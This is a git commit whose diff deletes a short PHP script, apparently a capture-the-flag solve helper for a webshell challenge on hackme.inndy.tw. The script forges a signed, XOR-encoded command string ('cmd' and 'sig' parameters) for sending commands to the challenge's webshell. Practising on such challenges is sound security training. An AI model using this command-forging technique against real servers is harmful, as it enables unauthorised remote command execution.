a20e548bf4b5999e97b6b958a82a75b0ab8e2d45
tfrnghub <44192266+tfrnghub@users.noreply.github.com>
2020-05-10 09:19:20 +0800

    web

--- 33 Web webshell/2.php
+++
@@ -1,8 +0,0 @@
-<?php
-$key = $_SERVER['HTTP_USER_AGENT'] . sha1('webshell.hackme.inndy.tw');
-$cmd = $_GET['cmd'];
-$sig = hash_hmac('SHA512', $cmd, $key);
-$cmdinput=$cmd^hash('SHA512', '221.218.67.74');
-echo "cmd=".urlencode($cmdinput)."&sig="."$sig";
-?>
- 
